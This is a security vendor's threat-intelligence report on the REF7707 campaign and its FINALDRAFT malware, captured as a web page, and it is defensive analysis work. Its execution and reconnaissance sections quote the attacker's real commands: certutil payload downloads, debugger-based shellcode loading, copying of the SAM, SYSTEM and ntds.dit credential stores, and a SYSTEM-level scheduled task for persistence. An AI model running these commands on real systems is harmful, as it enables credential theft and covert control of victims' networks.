16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"From South America to Southeast Asia: The Fragile Web of REF7707","slug":"fragile-web-ref7707","date":"2025-02-13","description":"REF7707 targeted a South American foreign ministry using novel malware families. Inconsistent evasion tactics and operational security missteps exposed additional adversary-owned infrastructure.","image":"ref7707.jpg","tags":[{"slug":"REF7707"},{"slug":"FINALDRAFT"},{"slug":"PATHLOADER"},{"slug":"GUIDLOADER"}],"body":{"raw":"\n## REF7707 summarized\n\nElastic Security Labs has been monitoring a campaign targeting the foreign ministry of a South American nation that has links to other compromises in Southeast Asia. We track this campaign as REF7707. \n\nWhile the REF7707 campaign is characterized by a well-engineered, highly capable, novel intrusion set, the campaign owners exhibited poor campaign management and inconsistent evasion practices.\n\nThe intrusion set utilized by REF7707 includes novel malware families we refer to as FINALDRAFT, GUIDLOADER, and PATHLOADER. We have provided a detailed analysis of their functions and capabilities in the malware analysis report of REF7707 - [You've Got Malware: FINALDRAFT Hides in Your Drafts](https://www.elastic.co/security-labs/finaldraft).\n\n## Key takeaways\n\n* REF7707 leveraged novel malware against multiple targets\n* The FINALDRAFT malware has both a Windows and Linux variant\n* REF7707 used an uncommon LOLBin to obtain endpoint execution\n* Heavy use of cloud and third-party services for C2\n* The attackers used weak operational security that exposed additional malware and infrastructure not used in this campaign\n\n## Campaign Overview \n\nIn late November 2024, Elastic Security Labs observed a tight cluster of endpoint behavioral alerts occurring at the Foreign Ministry of a South American country. As the investigation continued, we discovered a sprawling campaign and intrusion set that included novel malware, sophisticated targeting, and a mature operating cadence. \n\nWhile parts of the campaign showed a high level of planning and technical competence, numerous tactical oversights exposed malware pre-production samples, infrastructure, and additional victims.\n\n### Campaign layout (the diamond model)\n\nElastic Security Labs utilizes the [Diamond Model](https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf) to describe high-level relationships between adversaries, capabilities, infrastructure, and victims of intrusions. While the Diamond Model is most commonly used with single intrusions and leveraging Activity Threading (section 8) to create relationships between incidents, an adversary-centered (section 7.1.4) approach allows for a — although cluttered — single diamond.\n\n![REF7707 - Diamond Model](/assets/images/fragile-web-ref7707/image1.png \"REF7707 - Diamond Model\")\n\n## Execution Flow\n\n### Primary execution chain\n\nREF7707 was initially identified through Elastic Security telemetry of a South American nation’s Foreign Ministry. We observed a common LOLBin tactic [using Microsoft’s certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) application to download files from a remote server and save them locally.\n\n```\ncertutil  -urlcache -split -f https://[redacted]/fontdrvhost.exe C:\\ProgramData\\fontdrvhost.exe\n\ncertutil  -urlcache -split -f https://[redacted]/fontdrvhost.rar C:\\ProgramData\\fontdrvhost.rar\n\ncertutil  -urlcache -split -f https://[redacted]/config.ini C:\\ProgramData\\config.ini\n\ncertutil  -urlcache -split -f https://[redacted]/wmsetup.log C:\\ProgramData\\wmsetup.log\n```\n\nThe web server hosting `fontdrvhost.exe`, `fontdrvhost.rar`, `config.ini`, and `wmsetup.log` was located within the same organization; however, it was not running the Elastic Agent. This was the first lateral movement observed and provided insights about the intrusion. We’ll discuss these files in more detail, but for now, `fontdrvhost.exe` is a debugging tool, `config.ini` is a weaponized INI file, and `fontdrvhost.rar` was not recoverable.\n\n#### WinrsHost.exe\n\n[Windows Remote Management’s Remote Shell plugin](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (`WinrsHost.exe`) was used to download the files to this system from an unknown source system on a connected network. The plugin is the client-side process used by Windows Remote Management. It indicates that attackers already possessed valid network credentials and were using them for lateral movement from a previously compromised host in the environment. How these credentials were obtained is unknown; it is possible that the credentials were obtained from the web server hosting the suspicious files.\n\n![WinrsHost.exe is used to execute commands](/assets/images/fragile-web-ref7707/image4.png \"WinrsHost.exe is used to execute commands\")\n\nThe attacker downloaded `fontdrvhost.exe`, `fontdrvhost.rar`, `config.ini`, and `wmsetup.log` to the `C:\\ProgramData\\` directory; from there, the attacker moved to several other Windows endpoints. While we can’t identify all of the exposed credentials, we noted the use of a local administrator account to download these files.\n\nFollowing the downloads from the web server to the endpoint, we saw a cluster of behavioral rules firing in quick succession. \n\n![Behavioral rules accelerating](/assets/images/fragile-web-ref7707/image5.png \"Behavioral rules accelerating\")\n\nOn six Windows systems, we observed the execution of an unidentified binary (`08331f33d196ced23bb568689c950b39ff7734b7461d9501c404e2b1dc298cc1`) as a child of `Services.exe`. This suspicious binary uses a pseudo-randomly assigned file name consisting of six camel case letters with a `.exe` extension and is located in the `C:\\Windows\\` path (example: `C:\\Windows\\cCZtzzwy.exe`). We could not collect this file for analysis, but we infer that this is a variant of [PATHLOADER](https://www.elastic.co/security-labs/finaldraft) based on the file size (`170,495` bytes) and its location. This file was passed between systems using SMB.\n\n#### FontDrvHost.exe\n\nOnce the attacker collected `fontdrvhost.exe`, `fontdrvhost.rar`, `config.ini`, and `wmsetup.log`, it executed `fontdrvhost.exe` (`cffca467b6ff4dee8391c68650a53f4f3828a0b5a31a9aa501d2272b683205f9`) to continue with the intrusion. `fontdrvhost.exe` is a renamed version of the [Windows-signed debugger](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options) `CDB.exe`. Abuse of this binary allowed our attackers to execute malicious shellcode delivered in the `config.ini` file under the guise of trusted binaries.  \n\nCDB is a debugger that is over 15 years old. In researching how often it was submitted with suspicious files to VirusTotal, we see increased activity in 2021 and an aggressive acceleration starting in late 2024. \n\n![VirusTotal submissions and lookups for CDB.exe](/assets/images/fragile-web-ref7707/image3.png \"VirusTotal submissions and lookups for CDB.exe\")\n\nCDB is a [documented LOLBas file](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/), but there hasn’t been much-published research on how it can be abused. Security researcher mrd0x wrote a [great analysis](https://mrd0x.com/the-power-of-cdb-debugging-tool/) of CDB outlining how it can be used to run shellcode, launch executables, run DLLs, execute shell commands, and terminate security solutions (and even an [older analysis](https://web.archive.org/web/20210305190100/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html) from 2016 using it as a shellcode runner). While not novel, this is an uncommon attack methodology and could be used with other intrusion metadata to link actors across campaigns.\n\nWhile `config.ini` was not collected for analysis, it contained a mechanism through which `fontdrvhost.exe` loaded shellcode; how it was invoked is similar to FINALDRAFT.\n\n```\nC:\\ProgramData\\fontdrvhost.exe -cf C:\\ProgramData\\config.ini -o C:\\ProgramData\\fontdrvhost.exe\n```\n\n* `-cf` - specifies the path and name of a script file. This script file is executed as soon as the debugger is started\n* `config.ini` - this is the script to be loaded\n* `-o` - debugs all processes launched by the target application\n\nThen `fontdrvhost.exe` spawned `mspaint.exe` and injected shellcode into it.\n\n![Shellcode injection into mspaint.exe](/assets/images/fragile-web-ref7707/image2.png \"Shellcode injection into mspaint.exe\")\n\nElastic Security Labs reverse engineers analyzed this shellcode to identify and characterize the FINALDRAFT malware. Finally, `fontdrvhost.exe` injected additional shellcode into memory (`6d79dfb00da88bb20770ffad636c884bad515def4f8e97e9a9d61473297617e3`) that was also identified as the FINALDRAFT malware.\n\nAs described in the [analysis](https://www.elastic.co/security-labs/finaldraft) of FINALDRAFT, the malware defaults to `mspaint.exe` or `conhost.exe` if no target parameter is provided for an injection-related command.\n\n### Connectivity checks\n\nThe adversary performed several connectivity tests using the `ping.exe` command and via PowerShell.\n\nPowershell’s `Invoke-WebRequest` cmdlet is similar to `wget` or `curl,` which pulls down the contents of a web resource. This cmdlet may be used to download tooling from the command line, but that was not the case here. These requests in context with several `ping`s are more likely to be connectivity checks.\n\n`graph.microsoft[.]com` and `login.microsoftonline[.]com` are legitimately owned Microsoft sites that serve API and web GUI traffic for Microsoft’s Outlook cloud email service and other Office 365 products.\n\n* `ping graph.microsoft[.]com`\n* `ping www.google[.]com`\n* `Powershell Invoke-WebRequest -Uri \\\"hxxps://google[.]com\\`\n* `Powershell Invoke-WebRequest -Uri \\\"hxxps://graph.microsoft[.]com\\\" -UseBasicParsing`\n* `Powershell Invoke-WebRequest -Uri \\\"hxxps://login.microsoftonline[.]com\\\" -UseBasicParsing`\n\n`digert.ictnsc[.]com` and` support.vmphere[.]com` were adversary-owned infrastructure.\n\n* `ping digert.ictnsc[.]com`\n* `Powershell Invoke-WebRequest -Uri \\\"hxxps://support.vmphere[.]com\\\" -UseBasicParsing`\n\nWe cover more about these network domains in the infrastructure section below.\n\n### Reconnaissance / enumeration / credential harvesting\n\nThe adversary executed an unknown script called `SoftwareDistribution.txt`  using the `diskshadow.exe` utility, extracted the SAM, SECURITY, and SYSTEM Registry hives, and copied the Active Directory database (`ntds.dit`). These materials primarily contain credentials and credential metadata. The adversary used the 7zip utility to compress the results:\n\n```\ndiskshadow.exe /s C:\\\\ProgramData\\\\SoftwareDistribution.txt\n\ncmd.exe /c copy z:\\\\Windows\\\\System32\\\\config\\\\SAM C:\\\\ProgramData\\\\[redacted].local\\\\SAM /y\n\ncmd.exe /c copy z:\\\\Windows\\\\System32\\\\config\\\\SECURITY C:\\\\ProgramData\\\\[redacted].local\\\\SECURITY /y\n\ncmd.exe /c copy z:\\\\Windows\\\\System32\\\\config\\\\SYSTEM C:\\\\ProgramData\\\\[redacted].local\\\\SYSTEM /y\n\ncmd.exe /c copy z:\\\\windows\\\\ntds\\\\ntds.dit C:\\\\ProgramData\\\\[redacted].local\\\\ntds.dit /y\n\n7za.exe a [redacted].local.7z \\\"C:\\\\ProgramData\\\\[redacted].local\\\\\\\"\n```\n\nThe adversary also enumerated information about the system and domain:\n\n```\nsysteminfo\n\ndnscmd . /EnumZones\n\nnet group /domain\n\nC:\\\\Windows\\\\system32\\\\net1 group /domain\n\nquser\n\nreg query HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UUID\n\nreg query \\\"HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UUID\\\"\n\nreg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UUID\\\"\n```\n\n### Persistence\n\nPersistence was achieved using a [Scheduled Task](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create) that invoked the renamed `CDB.exe` debugger and the weaponized INI file every minute as `SYSTEM`. This methodology ensured that FINALDRAFT resided in memory.\n\n```\nschtasks /create /RL HIGHEST /F /tn \\\"\\\\Microsoft\\\\Windows\\\\AppID\\\\EPolicyManager\\\" \n/tr \\\"C:\\\\ProgramData\\\\fontdrvhost.exe -cf C:\\\\ProgramData\\\\config.ini -o C:\\\\ProgramData\\\\fontdrvhost.exe\\\" \n/sc MINUTE /mo 1 /RU SYSTEM\n```\n\n* `schtasks` - the Scheduled Task program\n* `/create` - creates a new scheduled task\n* `/RL HIGHEST` - specifies the run level of the job, `HIGHEST` runs as the highest level of privileges\n* `/F` - suppress warnings\n* `/tn \\\\Microsoft\\\\Windows\\\\AppID\\\\EPolicyManager\\` - task name, attempting to mirror an authentic looking scheduled task\n* `/tr \\\"C:\\\\ProgramData\\\\fontdrvhost.exe -cf C:\\\\ProgramData\\\\config.ini -o C:\\\\ProgramData\\\\fontdrvhost.exe\\\"` - task to run, in this case the `fontdrvhost.exe` commands we covered earlier\n* `/sc MINUTE` - schedule type, `MINUTE` specifies the to run on minute intervals\n* `/mo 1` - modifier, defines `1` for the schedule interval\n* `/RU SYSTEM` - defines what account to run as; in this situation, the task will run as the SYSTEM user\n\n### FINALDRAFT Analysis\n\nA technical deep-dive describing the capabilities and architecture of the FINALDRAFT and PATHLOADER malware is available [here](https://www.elastic.co/security-labs/finaldraft). At a high level, FINALDRAFT is a well-engineered, full-featured remote administration tool with the ability to accept add-on modules that extend functionality and proxy network traffic internally by multiple means.\n\nAlthough FINALDRAFT can establish command and control using various means, the most notable are the means we observed in our victim environment, [abuse of Microsoft’s Graph API](https://www.elastic.co/security-labs/finaldraft#communication-protocol). We first observed this type of third-party C2 in [SIESTAGRAPH](https://www.elastic.co/security-labs/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry), which we reported in December 2022.\n\nThis command and control type is challenging for defenders of organizations that heavily depend on network visibility to catch. Once the initial execution and check-in have been completed, all further communication proceeds through legitimate Microsoft infrastructure (`graph.microsoft[.]com`) and blends in with the other organizational workstations. It also supports relay functionality that enables it to proxy traffic for other infected systems. It evades defenses reliant on network-based intrusion detection and threat-intelligence indicators.\n\n#### PATHLOADER and GUIDLOADER\n\nBoth PATHLOADER and GUIDLOADER are used to download and execute encrypted shellcodes in memory. They were discovered in VirusTotal while investigating the C2 infrastructure and strings identified within a FINALDRAFT memory capture. They have only been observed in association with FINALDRAFT payloads.\n\nA May 2023 sample in VirusTotal is the earliest identified binary of the REF7707 intrusion set. This sample was first submitted by a web user from Thailand, `dwn.exe` (`9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf`) is a PATHLOADER variant that loads an encrypted FINALDRAFT binary from` poster.checkponit[.]com` and `support.fortineat[.]com`.\n\nBetween June and August of 2023, a Hong Kong VirusTotal web user uploaded [12 samples of GUIDLOADER](https://www.virustotal.com/gui/search/41a3a518cc8abad677bb2723e05e2f052509a6f33ea75f32bd6603c96b721081%250Ad9fc1cab72d857b1e4852d414862ed8eab1d42960c1fd643985d352c148a6461%250Af29779049f1fc2d45e43d866a845c45dc9aed6c2d9bbf99a8b1bdacfac2d52f2%250A17b2c6723c11348ab438891bc52d0b29f38fc435c6ba091d4464f9f2a1b926e0%250A20508edac0ca872b7977d1d2b04425aaa999ecf0b8d362c0400abb58bd686f92%250A33f3a8ef2c5fbd45030385b634e40eaa264acbaeb7be851cbf04b62bbe575e75%250A41141e3bdde2a7aebf329ec546745149144eff584b7fe878da7a2ad8391017b9%250A49e383ab6d092ba40e12a255e37ba7997f26239f82bebcd28efaa428254d30e1%250A5e3dbfd543909ff09e343339e4e64f78c874641b4fe9d68367c4d1024fe79249%250A7cd14d3e564a68434e3b705db41bddeb51dbb7d5425fd901c5ec904dbb7b6af0%250A842d6ddb7b26fdb1656235293ebf77c683608f8f312ed917074b30fbd5e8b43d%250Af90420847e1f2378ac8c52463038724533a9183f02ce9ad025a6a10fd4327f12?type=files). These samples each had minor modifications to how the encrypted payload was downloaded and were configured to use FINALDRAFT domains:\n\n* `poster.checkponit[.]com`\n* `support.fortineat[.]com`\n* Google Firebase (`firebasestorage.googleapis[.]com`)\n* Pastebin (`pastebin[.]com`)\n* A Southeast Asian University public-facing web storage system\n\nSome samples of GUIDLOADER appear unfinished or broken, with non-functional decryption routines, while others contain debug strings embedded in the binary. These variations suggest that the samples were part of a development and testing process.\n\n#### FINALDRAFT bridging OS’\n\nIn late 2024, two Linux ELF FINALDRAFT variants were uploaded to VirusTotal, one from the United States and one from Brazil. These samples feature similar C2 versatility and a partial reimplementation of the commands available in the Windows version. URLs were pulled from these files for `support.vmphere[.]com`, `update.hobiter[.]com`, and `pastebin.com`.\n\n## Infrastructure Analysis\n\nIn the [FINALDRAFT malware analysis report](https://www.elastic.co/security-labs/finaldraft), several domains were identified in the samples collected in the REF7707 intrusion, and other samples were identified through code similarity. \n\n### Service banner hashes\n\nA Censys search for `hobiter[.]com` (the domain observed in the ELF variant of FINALDRAFT, discussed in the previous section) returns an IP address of `47.83.8.198`. This server is Hong Kong-based and is serving ports `80` and `443`. The string “`hobiter[.]com`” is associated with the TLS certificate on port `443`. A Censys query pivot on the service banner hash of this port yields six additional servers that share that hash (seven total).\n\n| IP              | TLS Cert names       | Cert CN                       | ports                                                                    | ASN   | GEO                  |\n|-----------------|----------------------|-------------------------------|--------------------------------------------------------------------------|-------|----------------------|\n| `47.83.8.198`     | *.hobiter[.]com      | CloudFlare Origin Certificate | `80`, `443`                                                                  | `45102` | Hong Kong            |\n| `8.218.153.45`    | *.autodiscovar[.]com | CloudFlare Origin Certificate | `53`, `443`, `2365`, `3389`, `80`                                                  | `45102` | Hong Kong            |\n| `45.91.133.254`   | *.vm-clouds[.]net    | CloudFlare Origin Certificate | `443`, `3389`                                                                | `56309` | Nonthaburi, Thailand |\n| `8.213.217.182`   | *.ictnsc[.]com       | CloudFlare Origin Certificate | `53`, `443`, `3389`, `80`                                                        | `45102` | Bangkok, Thailand    |\n| `47.239.0.216`    | *.d-links[.]net      | CloudFlare Origin Certificate | `80`, `443`                                                                  | `45102` | Hong Kong            |\n| `203.232.112.186` | [NONE]               | [NONE]                        | `80`, `5357`, `5432`, `5985`, `8000`, `8080`, `9090`, `15701`, `15702`, `15703`, `33990` `47001` | `4766`  | Daejeon, South Korea |\n| `13.125.236.162`  | [NONE]               | [NONE]                        | `80`, `3389`, `8000`, `15111`, `15709`, `19000`                                      | `16509` | Incheon, South Korea |\n\n\nTwo servers (`203.232.112[.]186` and `13.125.236[.]162`) do not share the same profile as the other five. While the service banner hash still matches, it is not on port `443`, but on ports `15701`,` 15702`, `15703`, and `15709`. Further, the ports in question do not appear to support TLS communications. We have not attributed them to REF7707 with a high degree of confidence but are including them for completeness.\n\nThe other five servers, including the original “hobiter” server, share several similarities: \n\n* Service banner hash match on port `443`\n* Southeast Asia geolocations\n* Windows OS\n* Cloudflare issued TLS certs\n* Most have the same ASN belonging to Alibaba\n\n#### Hobiter and VMphere\n\n`update.hobiter[.]com` and` support.vmphere[.]com` were found in an ELF binary ([biosets.rar](https://www.virustotal.com/gui/file/f45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9)) from December 13, 2024. Both domains were registered over a year earlier, on September 12, 2023. This ELF binary features similar C2 versatility and a partial reimplementation of the commands available in the Windows version of FINALDRAFT.\n\nA name server lookup of `hobiter[.]com` and `vmphere[.]com` yields only a Cloudflare name server record for each and no A records. Searching for their known subdomains provides us with A records pointing to Cloudflare-owned IP addresses.\n\n#### ICTNSC\n\n`ictnsc[.]com` is directly associated with the REF7707 intrusion above from a connectivity check (`ping digert.ictnsc[.]com`) performed by the attackers. The server associated with this domain (`8.213.217[.]182`) was identified through the Censys service banner hash on the HTTPS service outlined above. Like the other identified infrastructure, the subdomain resolves to Cloudflare-owned IP addresses, and the parent domain only has a Cloudflare NS record. `ictnsc[.]com` was registered on February 8, 2023.\n\nWhile we cannot confirm the association as malicious, it should be noted that the domain `ict.nsc[.]ru` is the Federal Research Center for Information and Computational Technologies web property, often referred to as the FRC or the ICT. This Russian organization conducts research in various areas like computer modeling, software engineering, data processing, artificial intelligence, and high-performance computing. \n\nWhile not observed in the REF7707 intrusion, the domain we observed (`ictnsc[.]com`) has an `ict` subdomain (`ict.ictnsc[.]com`), which is strikingly similar to `ict.nsc[.]ru`. Again, we cannot confirm if they are related to the legitimate FRC or ITC, it seems the threat actor intended for the domains to be similar, conflated, or confused with each other.\n\n#### Autodiscovar\n\n`Autodiscovar[.]com` has not been directly associated with any FINALDRAFT malware. It has been indirectly associated with REF7707 infrastructure through pivots on web infrastructure identifiers. The parent domain only has a Cloudflare NS record. A subdomain [identified through VirusTotal](https://www.virustotal.com/gui/domain/autodiscovar.com/relations) (`cloud.autodiscovar[.]com`) points to Cloudflare-owned IP addresses. This domain name resembles other FINALDRAFT and REF7707 web infrastructure and shares the HTTPS service banner hash. This domain was registered on August 26, 2022.\n\n#### D-links and VM-clouds\n`d-links[.]net` and `vm-clouds[.]net` were both registered on September 12, 2023, the same day as `hobiter[.]com` and `vmphere[.]com`. The servers hosting these sites also share the same HTTPS service banner hash. They are not directly associated with the FINALDRAFT malware nor have current routable subdomains, though `pol.vm-clouds[.]net` was previously registered.\n\n#### Fortineat\n\n`support.fortineat[.]com` was hard-coded in the PATHLOADER sample (`dwn.exe`). During our analysis of the domain, we discovered that it was not currently registered. To identify any other samples communicating with the domain, our team registered this domain and configured a web server to listen for incoming connections. \n\nWe recorded connection attempts over port `443`, where we identified a specific incoming byte pattern. The connections were sourced from eight different telecommunications and Internet infrastructure companies in Southeast Asia, indicating possible victims of the REF7707 intrusion set.  \n\n#### Checkponit\n\n`poster.checkponit[.]com` was observed in four GUIDLOADER samples and a PATHLOADER sample between May and July 2023, and it was used to host the FINALDRAFT encrypted shellcode. The `checkponit[.]com` registration was created on August 26, 2022. There are currently no A records for `checkponit[.]com` or `poster.checkponit[.]com`.\n\n#### Third-party infrastructure\n\nMicrosoft’s `graph.microsoft[.]com` is used by the FINALDRAFT PE and ELF variants for command and control via the Graph API. This service is ubiquitous and used for critical business processes of enterprises using Office 365. Defenders are highly encouraged to NOT block-list this domain unless business ramifications are understood.\n\nGoogle’s Firebase service (`firebasestorage.googleapis[.]com`), Pastebin (`pastebin[.]com`), and a Southeast Asian University are third-party services used to host the encrypted payload for the loaders (PATHLOADER and GUIDLOADER) to download and decrypt the last stage of FINALDRAFT. \n\n## REF7707 timeline\n\n![REF7707 timeline](/assets/images/fragile-web-ref7707/image6.png \"FINALDRAFT timeline\")\n\n## Conclusion\n\nREF7707 was discovered while investigating an intrusion of a South American nation's Foreign Ministry.\n\nThe investigation revealed novel malware like FINALDRAFT and its various loaders. These tools were deployed and supported using built-in operating system features that are difficult for traditional anti-malware tools to detect.\n\nFINALDRAFT co-opts Microsoft’s graph API service for command and control to minimize malicious indicators that would be observable to traditional network-based intrusion detection and prevention systems. Third-party hosting platforms for encrypted payload staging also challenge these systems early in the infection chain.\n\nAn overview of the VirusTotal submitters and pivots using the indicators in this report shows a relatively heavy geographic presence in Southeast Asia and South America. SIESTAGRAPH, similarly, was the first in-the-wild graph API abuse we had observed, and it (REF2924) involved an attack on a Southeast Asian nation’s Foreign Ministry.\n\nAt Elastic Security Labs, we champion defensive capabilities across infosec domains operated by knowledgeable professionals to mitigate advanced threats best.\n\n## REF7707 through MITRE ATT\u0026CK\n\nElastic uses the [MITRE ATT\u0026CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.\n\n* [Reconnaissance](https://attack.mitre.org/tactics/TA0043/)\n* [Execution](https://attack.mitre.org/tactics/TA0002)\n* [Persistence](https://attack.mitre.org/tactics/TA0003)\n* [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)\n* [Defense Evasion](https://attack.mitre.org/tactics/TA0005)\n* [Credential Access](https://attack.mitre.org/tactics/TA0006)\n* [Discovery](https://attack.mitre.org/tactics/TA0007)\n* [Lateral Movement](https://attack.mitre.org/tactics/TA0008)\n* [Collection](https://attack.mitre.org/tactics/TA0009)\n* [Command and Control](https://attack.mitre.org/tactics/TA0011)\n* [Exfiltration](https://attack.mitre.org/tactics/TA0010)\n\n## Detecting REF7707\n\n### YARA\n\n* [FINALDRAFT (Windows)](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_FinalDraft.yar)\n* [FINALDRAFT (Linux)](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Trojan_FinalDraft.yar)\n* [FINALDRAFT (Multi-OS)](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Trojan_FinalDraft.yar)\n* [PATHLOADER](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PathLoader.yar)\n* [GUIDLOADER](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_GuidLoader.yar)\n\n## Observations\n\nThe following observables were discussed in this research.\n\n| Observable                                                       | Type        | Name            | Reference              |\n|------------------------------------------------------------------|-------------|-----------------|------------------------|\n| `39e85de1b1121dc38a33eca97c41dbd9210124162c6d669d28480c833e059530` | SHA-256     | `Session.x64.dll` | FINALDRAFT             |\n| `83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c` | SHA-256     | `pfman`           | FINALDRAFT ELF         |\n| `f45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9` | SHA-256     | `biosets.rar`     | FINALDRAFT ELF         |\n| `9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf` | SHA-256     | `dwn.exe`         | PATHLOADER             |\n| `41a3a518cc8abad677bb2723e05e2f052509a6f33ea75f32bd6603c96b721081` | SHA-256     | `5.exe`           | GUIDLOADER             |\n| `d9fc1cab72d857b1e4852d414862ed8eab1d42960c1fd643985d352c148a6461` | SHA-256     | `7.exe`           | GUIDLOADER             |\n| `f29779049f1fc2d45e43d866a845c45dc9aed6c2d9bbf99a8b1bdacfac2d52f2` | SHA-256     | `8.exe`           | GUIDLOADER             |\n| `17b2c6723c11348ab438891bc52d0b29f38fc435c6ba091d4464f9f2a1b926e0` | SHA-256     | `3.exe`           | GUIDLOADER             |\n| `20508edac0ca872b7977d1d2b04425aaa999ecf0b8d362c0400abb58bd686f92` | SHA-256     | `1.exe`           | GUIDLOADER             |\n| `33f3a8ef2c5fbd45030385b634e40eaa264acbaeb7be851cbf04b62bbe575e75` | SHA-256     | `1.exe`           | GUIDLOADER             |\n| `41141e3bdde2a7aebf329ec546745149144eff584b7fe878da7a2ad8391017b9` | SHA-256     | `11.exe`          | GUIDLOADER             |\n| `49e383ab6d092ba40e12a255e37ba7997f26239f82bebcd28efaa428254d30e1` | SHA-256     | `2.exe`           | GUIDLOADER             |\n| `5e3dbfd543909ff09e343339e4e64f78c874641b4fe9d68367c4d1024fe79249` | SHA-256     | `4.exe`           | GUIDLOADER             |\n| `7cd14d3e564a68434e3b705db41bddeb51dbb7d5425fd901c5ec904dbb7b6af0` | SHA-256     | `1.exe`           | GUIDLOADER             |\n| `842d6ddb7b26fdb1656235293ebf77c683608f8f312ed917074b30fbd5e8b43d` | SHA-256     | `2.exe`           | GUIDLOADER             |\n| `f90420847e1f2378ac8c52463038724533a9183f02ce9ad025a6a10fd4327f12` | SHA-256     | `6.exe`           | GUIDLOADER             |\n| `poster.checkponit[.]com`                                          | domain-name |                 | REF7707 infrastructure |\n| `support.fortineat[.]com`                                          | domain-name |                 | REF7707 infrastructure |\n| `update.hobiter[.]com`                                             | domain-name |                 | REF7707 infrastructure |\n| `support.vmphere[.]com`                                            | domain-name |                 | REF7707 infrastructure |\n| `cloud.autodiscovar[.]com`                                         | domain-name |                 | REF7707 infrastructure |\n| `digert.ictnsc[.]com`                                              | domain-name |                 | REF7707 infrastructure |\n| `d-links[.]net`                                                    | domain-name |                 | REF7707 infrastructure |\n| `vm-clouds[.]net`                                                  | domain-name |                 | REF7707 infrastructure |\n| `47.83.8[.]198`                                                      | ipv4-addr   |                 | REF7707 infrastructure |\n| `8.218.153[.]45`                                                     | ipv4-addr   |                 | REF7707 infrastructure |\n| `45.91.133[.]254`                                                    | ipv4-addr   |                 | REF7707 infrastructure |\n| `8.213.217[.]182`                                                    | ipv4-addr   |                 | REF7707 infrastructure |\n| `47.239.0[.]216`                                                     | ipv4-addr   |                 | REF7707 infrastructure 